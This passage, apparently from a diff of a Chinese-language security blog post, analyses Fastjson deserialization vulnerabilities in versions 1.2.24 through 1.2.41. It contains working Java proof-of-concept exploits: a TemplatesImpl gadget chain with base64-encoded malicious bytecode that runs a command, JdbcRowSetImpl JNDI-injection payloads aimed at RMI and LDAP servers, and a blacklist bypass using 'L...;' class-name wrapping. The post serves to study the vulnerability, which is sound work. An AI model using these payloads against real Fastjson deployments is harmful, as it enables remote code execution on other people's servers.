+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>fastjson<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.2.24<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></div><h4 id="templatesimpl链">TemplatesImpl链</h4>
+<p>既然都是可以调用getter和setter了，那么在JDK8环境下最经典的还是TemplatesImpl链了，这里利用的getter方法还是getOutputProperties()方法，这个方法内部会调用到newTransformer()方法，从而完成一次完整的链子的调用，POC如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassClassPath</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//使用javassist定义恶意代码</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">classPool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">classPool</span><span class="p">.</span><span class="na">insertClassPath</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ClassClassPath</span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">.</span><span class="na">class</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">cc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">classPool</span><span class="p">.</span><span class="na">makeClass</span><span class="p">(</span><span class="s">&#34;Evil&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="o">=</span><span class="w"> </span><span class="s">&#34;java.lang.Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;);&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cc</span><span class="p">.</span><span class="na">makeClassInitializer</span><span class="p">().</span><span class="na">insertBefore</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cc</span><span class="p">.</span><span class="na">setSuperclass</span><span class="p">(</span><span class="n">classPool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">()));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">classBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cc</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">encodedCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">classBytes</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">encodedCode</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&#34;,\&#34;_name\&#34;:\&#34;fupanc\&#34;,\&#34;_bytecodes\&#34;:[\&#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\&#34;],\&#34;_class\&#34;:null,\&#34;_tfactory\&#34;:{},\&#34;_outputProperties\&#34;:{}}&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">jsonObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">Feature</span><span class="p">.</span><span class="na">SupportNonPublicField</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>运行后弹出计算机，这里设置了<code>_outputProperties</code>是为了可以调用到他的getter方法，注意一下这里的代码构造，对于<code>byte[][]</code>类型的数据，由于base64编码只能编码<code>byte[]</code>类型的数据，所以这就又加了一个数组将其转换成<code>[][]</code>类型的数据。</p>
+<p>这里就说明几个点，算是比较关键的点：</p>
+<ul>
+<li>网上有的payload没管<code>_class</code>变量，这是因为这个变量默认是null：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411180902467.png" alt="image-20250411180902467"></p>
+<ul>
+<li>这里并没有对<code>_tfactory</code>变量进行赋值，这是因为如果json字符串没有对变量进行赋值，fastjson会获取这个变量的默认类型的无参构造方法进行实例化然后赋值，而这里刚好是我们需要的类型：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411181545359.png" alt="image-20250411181545359"></p>
+<ul>
+<li>这里利用了一个<code>Feature.SupportNonPublicField</code>，这个起到了什么作用，我们在获取方法时，比如setter，其实setter基本都是private类型的变量，这里设置这个就是为了用来给私有变量进行赋值的。</li>
+</ul>
+<p>这个算是比较老版本的了，可以调试跟一下，这类的过程就和前面分析的parseObject()过程是不一样了的，我们这里还需要传入另外一个Feature.SupportNonPublicField，其实是并没有调用toJSON的：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411184310920.png" alt="image-20250411184310920"></p>
+<p>也就和前面分析的过程不一样了，所以真正调用getter的地方并不是前面分析的toJSON()方法的序列化，而是另外的地方，基本过程在前面补充说明中，现在来看看为什么这个<code>_outputProperties</code>变量符合那几个条件：
+变量的getter方法如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411221326498.png" alt="image-20250411221326498"></p>
+<p>返回类型为Properties.class，其父类为Hashtable，而Hashtable实现了Map接口，然后这个类没有setter方法，不是静态方法，长度大于4，完美符合，这也就是为什么在反序列化的时候调用到了getter方法从而实现了一次调用链的执行。</p>
+<h4 id="jdbcrowsetimpl链">JdbcRowSetImpl链</h4>
+<p>这里利用到的类是jdbcRowSetImpl类，这个类位于<code>com.sun.rowset.JdbcRowSetImpl</code>，简单看了一下这个类，可以看到一个可以触发jndi注入的方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412130255222.png" alt="image-20250412130255222"></p>
+<p>看一下这里有无调用connect()方法的代码，找到了一个getter：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412130526131.png" alt="image-20250412130526131"></p>
+<p>和一个setter：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412130545784.png" alt="image-20250412130545784"></p>
+<p>对于这个getter，可以想一下是否可以在反序列化的时候调用，对应变量无setter方法，返回属性为DatabaseMetaData，不满足那几个属性之一，只能放弃。那么现在着重看setter方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412161931619.png" alt="image-20250412161931619"></p>
+<p>需要conn为null，而在前面的学习中，可以知道实例化类时是调用的<code>newInstance()</code>，也就是会调用默认的构造方法，可以看一下这里的默认的构造方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412162040971.png" alt="image-20250412162040971"></p>
+<p>会将conn设置为null，然后再跟进connect()方法需要的参数：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412162130197.png" alt="image-20250412162130197"></p>
+<p>主要就是这个getDataSourceName()方法，跟进发现是返回的父类BaseRowSet的一个变量：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412162202091.png" alt="image-20250412162202091"></p>
+<p>还是直接赋值即可，父类存在setter方法来进行赋值：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412163054996.png" alt="image-20250412163054996"></p>
+<p>那么就可以尝试打一个jndi了（注意java的版本）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;rmi://127.0.0.1:1099/Hello\&#34;,\&#34;autoCommit\&#34;:\&#34;true\&#34;}&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>我这里是尝试的打rmi，基本流程就和jndi打rmi一样的，最后成功弹出计算机。</p>
+<h3 id="1225fastjson1241">1.2.25&lt;=fastjson&lt;=1.2.41</h3>
+<p>在这个版本下，加了黑白名单，具体以第一个版本，后面几个都是绕过。</p>
+<p>pom依赖改成：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>fastjson<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.2.25<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></div><p>其实就是改一下版本即可。</p>
+<p>可以看到加了的黑名单：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412170058841.png" alt="image-20250412170058841"></p>
+<p>具体的黑名单如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">bsh</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">com</span><span class="p">.</span><span class="na">mchange</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">com</span><span class="p">.</span><span class="na">sun</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Thread</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">java</span><span class="p">.</span><span class="na">net</span><span class="p">.</span><span class="na">Socket</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">java</span><span class="p">.</span><span class="na">rmi</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">javax</span><span class="p">.</span><span class="na">xml</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">bcel</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">beanutils</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">collections</span><span class="p">.</span><span class="na">Transformer</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">collections</span><span class="p">.</span><span class="na">functors</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">collections4</span><span class="p">.</span><span class="na">comparators</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">fileupload</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">myfaces</span><span class="p">.</span><span class="na">context</span><span class="p">.</span><span class="na">servlet</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">tomcat</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">wicket</span><span class="p">.</span><span class="na">util</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">codehaus</span><span class="p">.</span><span class="na">groovy</span><span class="p">.</span><span class="na">runtime</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">hibernate</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">jboss</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">mozilla</span><span class="p">.</span><span class="na">javascript</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">python</span><span class="p">.</span><span class="na">core</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="w">
+</span></span></span></code></pre></div><p>把com.sun包下的类都禁了，导致前面的两条链子都打不了了。</p>
+<p>这里再来简单看一下调用链过程，还是用前面的打jndi注入的地方来调试，主要的不同在于如下代码：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412171234410.png" alt="image-20250412171234410"></p>
+<p>原本我们是直接调用loadClass()方法来加载类，这里加了一个检测，跟进这里的checkAutoType()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412172108550.png" alt="image-20250412172108550"></p>
+<p>调用栈为：</p>
+<pre tabindex="0"><code>checkAutoType:844, ParserConfig (com.alibaba.fastjson.parser)
+parseObject:322, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:137, JSON (com.alibaba.fastjson)
+parse:128, JSON (com.alibaba.fastjson)
+parseObject:201, JSON (com.alibaba.fastjson)
+main:10, Fastjson_Test (fastjson)
+</code></pre><p>再看上图，autoTypeSupport默认是false，这里如果想要调用到loadClass()方法，除了不匹配到黑名单，还需要匹配到白名单，但是这里的白名单又是空：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412172335592.png" alt="image-20250412172335592"></p>
+<p>如果不进行处理的话就不可能可以调用到loadClass()方法。但是在这个方法的处理中，可以看到有三个地方都有调用TypeUtils.loadClass()，除了上面这个，顺序分别为：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412172657192.png" alt="image-20250412172657192"></p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412172108550.png" alt="image-20250412172108550"></p>
+<p>以及：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412172719199.png" alt="image-20250412172719199"></p>
+<p>在最后一个图片，可以看到这里的调用都是和autoTypeSupport变量相关的，这里的expectClass变量是形参传递的，肯定为null，那么这里只要可以尝试控制autoTypeSupport为true，并且不触发黑名单，白名单不用管，反正白名单是不会触发的，本来就是一个空的。那么就可以尝试在这里进行一次加载类。</p>
+<p>黑名单怎么解决，当时可以尝试使用黑名单之外的类，还有另外的解法，跟进TypeUtils.loadClass()方法，有一个利用点：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412174956868.png" alt="image-20250412174956868"></p>
+<p>最开始我们是直接进行最下面方法的调用，然后直接返回加载的类，现在看我们这里标注出来的两个代码块：</p>
+<ul>
+<li>
+<p>对于第一个，如果以<code>[</code>开头，就是<code>@type</code>键的值以<code>[</code>开头，就使用substring方法来截断获取<code>[</code>后面的方法，然后再次调用loadClass()方法来加载，但是会之类最后是放进了一个数组，后面还需要进行处理。</p>
+</li>
+<li>
+<p>对于第二个，如果对应值以<code>L</code>开头并且以<code>;</code>结尾，那么同样截取中间的内容，然后再次调用loadClass()方法来加载，这个就比较好用了，是直接返回的loadClass()处理完的数据，不用在后面的代码进行处理。</p>
+</li>
+</ul>
+<p>这里我们先以第二个为例来完成一次调用，再来分析构造第一个的payload。在前面的了解中，我们可以知道离不开的变量就是autoTypeSupport，我们需要他为false，跟进这个变量的赋值：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412175749373.png" alt="image-20250412175749373"></p>
+<p>再看AUTO_SUPPORT变量的赋值，默认情况下就是如下代码：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412181516840.png" alt="image-20250412181516840"></p>
+<p>知道这里最后为false即可，怎么设置这个类的autoTypeSupport变量，在这个类其实是存在一个setter方法的，用于给这个变量赋值：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412181721989.png" alt="image-20250412181721989"></p>
+<p>但是我们并不能直接在json数据字符串中赋值，因为这个类也是直接从形参上定义的，简单溯源如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412181847468.png" alt="image-20250412181847468"></p>
+<p>调用的config变量的这个方法（也就是ParserConfig类的checkAutoType()方法），并且可以知道是DefaultJSONParser这个类的config变量，也是调试分析时经常出现的，溯到DefaultJSONParser类的实例化：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412182154573.png" alt="image-20250412182154573"></p>
+<p>对应内容为：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412182544145.png" alt="image-20250412182544145"></p>
+<p>形参传递就不多说了，跟一下就知道了，所以config的赋值就是这个，从中可以看出这里就是实例化了一个ParserConfig类，变量都是默认的，所以在json字符串对是不可控的，所以其实有一定的局限性的，最后的POC如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;Lcom.sun.rowset.JdbcRowSetImpl;\&#34;,\&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:2333/fupanc\&#34;,\&#34;autoCommit\&#34;:\&#34;true\&#34;}&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>运行后成功弹出计算机。</p>
+<p>对应的TemplatesImpl如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
